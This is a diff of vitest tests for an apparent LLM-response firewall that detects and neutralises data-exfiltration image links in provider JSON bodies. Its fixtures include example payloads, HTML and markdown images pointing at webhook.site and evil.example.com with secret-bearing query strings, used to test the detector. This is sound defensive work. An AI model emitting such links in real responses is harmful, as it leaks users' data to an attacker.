@@ -1,5 +1,5 @@
 import { describe, it, expect } from 'vitest'
-import { scanResponseExfil, neutralizeExfil } from '../../src/detection/responseExfil.js'
+import { scanResponseExfil, neutralizeExfil, scanJsonTextFields, neutralizeJsonExfil } from '../../src/detection/responseExfil.js'
 
 // Test predicate: treat the attacker host as an exfil sink, everything else clean.
 const isExfil = (h: string) => h === 'evil.example.com' || h === 'webhook.site'
@@ -347,5 +347,96 @@ describe('neutralizeExfil', () => {
   it('leaves text without findings unchanged', () => {
     const text = 'nothing to see ![ok](https://trusted.com/x.png)'
     expect(neutralizeExfil(text, [])).toBe(text)
+  })
+})
+
+// #580 step 4: Go's encoding/json writes <, > and & as \u003c, \u003e and
+// \u0026, so the raw body holds no tag; the client renders the decoded text.
+const goJson = (value: unknown) => JSON.stringify(value).replace(/</g, '\\u003c').replace(/>/g, '\\u003e').replace(/&/g, '\\u0026')
+
+describe('scanJsonTextFields', () => {
+  const img = '<img src="https://webhook.site/c?d=secret&v=2">'
+
+  it('finds the tag in the decoded text, by the URL the client fetches', () => {
+    const body = goJson({ content: [{ type: 'text', text: `chart ${img}` }] })
+    const f = scanJsonTextFields(body, isExfil, [])
+    expect(f.map(x => [x.kind, x.url])).toEqual([['html-image', 'https://webhook.site/c?d=secret&v=2']])
+  })
+
+  it('reads every provider shape: OpenAI message content, Responses output, Gemini parts', () => {
+    for (const body of [
+      goJson({ choices: [{ message: { role: 'assistant', content: img } }] }),
+      goJson({ output: [{ type: 'message', content: [{ type: 'output_text', text: img }] }] }),
+      goJson({ candidates: [{ content: { parts: [{ text: img }] } }] }),
+    ]) expect(scanJsonTextFields(body, isExfil, []), body).toHaveLength(1)
+  })
+
+  it('does not repeat what the raw scan found, escaped slashes included', () => {
+    const body = JSON.stringify({ text: 'see ![c](https://evil.example.com/c?d=1)' }).replace(/\//g, '\\/')
+    const raw = scanResponseExfil(body, isExfil)
+    expect(raw).toHaveLength(1)
+    expect(raw[0]!.url).toContain('\\/')
+    expect(scanJsonTextFields(body, isExfil, raw)).toEqual([])
+  })
+
+  it('reads only rendered text, not tool input, ids or metadata', () => {
+    const body = goJson({ id: img, content: [{ type: 'tool_use', name: 'fetch', input: { url: img, html: img } }] })
+    expect(scanJsonTextFields(body, isExfil, [])).toEqual([])
+  })
+
+  it('returns nothing for a body that is not JSON, and survives deep nesting', () => {
+    expect(scanJsonTextFields(`not json ${img}`, isExfil, [])).toEqual([])
+    const deep = '['.repeat(100_000) + ']'.repeat(100_000)
+    expect(() => scanJsonTextFields(deep, isExfil, [])).not.toThrow()
+  })
+
+  it('stays linear on 200 KB of escaped tags in one field and across many', () => {
+    for (const filler of ['<img src="', ' ', '1-', 'aGVsbG8_d29ybGQ']) {
+      const one = goJson({ text: filler.repeat(Math.ceil(200_000 / filler.length)) })
+      const many = goJson({ content: Array.from({ length: 20_000 }, () => ({ text: `${filler}x` })) })
+      const started = Date.now()
+      scanJsonTextFields(one, isExfil, [])
+      scanJsonTextFields(many, isExfil, [])
+      expect(Date.now() - started, filler).toBeLessThan(2000)
+    }
+  })
+})
+
+describe('neutralizeJsonExfil', () => {
+  const img = '<img src="https://webhook.site/c?d=1&v=2">'
+
+  // On main the raw scan found no tag in these bodies, so block mode
+  // forwarded the destination without an event.
+  it('takes out a destination the raw scan does not see, in every body shape', () => {
+    for (const body of [
+      goJson({ text: `chart ${img}` }),
+      goJson({ id: 'm', content: [{ type: 'text', text: `chart ${img}` }] }),
+      goJson({ id: 'm', content: [{ type: 'text', text: `a ${img} b` }, { type: 'text', text: 'untouched <b>' }] }),
+      goJson({ choices: [{ message: { content: img.replace('&v=2', '') } }] }),
+    ]) {
+      const raw = scanResponseExfil(body, isExfil)
+      expect(neutralizeExfil(body, raw), body).toContain('webhook.site')
+      const out = neutralizeJsonExfil(body, isExfil, raw)
+      expect(out, body).not.toBeNull()
+      expect(out, body).not.toContain('webhook.site')
+    }
+  })
+
+  it('rewrites only the field that held it', () => {
+    const body = goJson({ id: 'msg_1', content: [{ type: 'text', text: `a ${img} b` }, { type: 'text', text: 'untouched <b>' }] })
+    const out = neutralizeJsonExfil(body, isExfil, scanResponseExfil(body, isExfil))
+    expect(JSON.parse(out!)).toEqual({ id: 'msg_1', content: [{ type: 'text', text: 'a <img src="llm-fw-blocked-exfil-url"> b' }, { type: 'text', text: 'untouched <b>' }] })
+  })
+
+  it('keeps the exact bytes when the raw replacement already took everything out', () => {
+    const plain = goJson({ content: [{ type: 'text', text: 'see ![c](https://evil.example.com/c?d=1) and <b>' }] })
+    const out = neutralizeJsonExfil(plain, isExfil, scanResponseExfil(plain, isExfil))
+    expect(out).toBe(plain.replace('https://evil.example.com/c?d=1', 'llm-fw-blocked-exfil-url'))
+    expect(out).toContain('\\u003cb\\u003e')
+  })
+
+  it('leaves a body that is not JSON to the raw replacement', () => {
+    const text = 'see ![c](https://evil.example.com/c?d=1)'
+    expect(neutralizeJsonExfil(text, isExfil, scanResponseExfil(text, isExfil))).toBe('see ![c](llm-fw-blocked-exfil-url)')
   })
 })
